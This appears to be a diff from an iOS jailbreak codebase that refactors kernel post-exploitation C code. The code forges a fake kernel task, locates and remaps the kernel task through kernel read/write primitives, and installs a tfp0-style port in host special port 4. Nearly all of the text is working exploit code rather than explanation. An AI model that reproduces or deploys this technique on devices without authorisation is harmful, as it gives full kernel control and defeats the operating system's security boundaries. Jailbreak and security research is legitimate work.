@@ -20,18 +20,18 @@ uint64_t make_fake_task(uint64_t vm_map) {
 
     void* fake_task = malloc(0x1000);
     memset(fake_task, 0, 0x1000);
-    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
-    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
-    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
-    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
+    *(uint32_t*)(fake_task + _koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
+    *(uint32_t*)(fake_task + _koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
+    *(uint64_t*)(fake_task + _koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
+    *(uint8_t*)(fake_task + _koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
     Kernel_memcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
     free(fake_task);
 
     return fake_task_kaddr;
 }
 
-// in async_wake.h
-void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr);
+// in kernel_utils.h
+void MakePortFakeTaskPort(mach_port_t port, uint64_t task_kaddr);
 
 int setHGSP4() {
     // huge thanks to Siguza for hsp4 & v0rtex
@@ -79,20 +79,8 @@ int setHGSP4() {
 
     {
         // find kernel task first
-        kernel_task_kaddr = KernelRead_64bits(TaskSelfAddr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-
-        while (kernel_task_kaddr != 0) {
-            uint64_t bsd_info = KernelRead_64bits(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-
-            uint32_t pid = KernelRead_32bits(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
-
-            if (pid == 0) {
-                break;
-            }
-
-            kernel_task_kaddr = KernelRead_64bits(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
-        }
-
+        kernel_task_kaddr = taskStruct_of_pid(0);
+        
         if (kernel_task_kaddr == 0) {
             printf("[remap_kernel_task] failed to find kernel task\n");
             return 1;
@@ -121,13 +109,13 @@ int setHGSP4() {
     uint64_t zone_map = KernelRead_64bits(zone_map_kptr);
 
     // kernel_task->vm_map == kernel_map
-    uint64_t kernel_map = KernelRead_64bits(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+    uint64_t kernel_map = KernelRead_64bits(kernel_task_kaddr + _koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
 
     uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
     uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
 
-    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
-    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
+    MakePortFakeTaskPort(zm_fake_task_port, zm_fake_task_kptr);
+    MakePortFakeTaskPort(km_fake_task_port, km_fake_task_kptr);
 
     km_fake_task_port = zm_fake_task_port;
 
@@ -166,9 +154,9 @@ int setHGSP4() {
     uint64_t port_kaddr = FindPortAddress(*port);
     printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
 
-    make_port_fake_task_port(*port, remapped_task_addr);
+    MakePortFakeTaskPort(*port, remapped_task_addr);
 
-    if (KernelRead_64bits(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
+    if (KernelRead_64bits(port_kaddr + _koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
         printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
         return 1;
     }
@@ -176,7 +164,7 @@ int setHGSP4() {
     // lck_mtx -- arm: 8  arm64: 16
     const int off_host_special = 0x10;
     uint64_t host_priv_kaddr = FindPortAddress(mach_host_self());
-    uint64_t realhost_kaddr = KernelRead_64bits(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t realhost_kaddr = KernelRead_64bits(host_priv_kaddr + _koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     KernelWrite_64bits(realhost_kaddr + off_host_special + 4 * sizeof(void*), port_kaddr);
 
     return 0;
